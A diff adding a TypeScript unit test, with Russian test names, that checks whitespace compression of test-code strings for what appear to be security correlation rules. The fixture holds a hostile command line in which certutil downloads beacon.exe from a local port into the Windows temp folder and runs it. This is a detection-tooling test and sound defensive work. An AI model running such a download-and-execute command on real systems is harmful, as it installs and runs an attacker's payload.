@@ -3,6 +3,20 @@ import { TestHelper } from '../../helpers/testHelper';
 
 suite('TestHelper.compressTestCode', async () => {
 
+	test('Пробельные символы перед символом новой строки', async () => {
+
+		const formatted =
+`expect 1 {
+	"correlation_name": null, 
+	"object.process.cmdline": "c:\\windows\\system32\\certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe c:\\windows\\temp\\beacon.exe & c:\\windows\\temp\\beacon.exe"
+	}`;
+			
+		const compressed = `expect 1 {"correlation_name": null, "object.process.cmdline": "c:\\windows\\system32\\certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe c:\\windows\\temp\\beacon.exe & c:\\windows\\temp\\beacon.exe"}`;
+
+		const actual = TestHelper.compressTestCode(formatted);
+		assert.strictEqual(actual, compressed);
+	});
+
 	test('Корректная обработка localhost ipv6', async () => {
 
 const formatted =
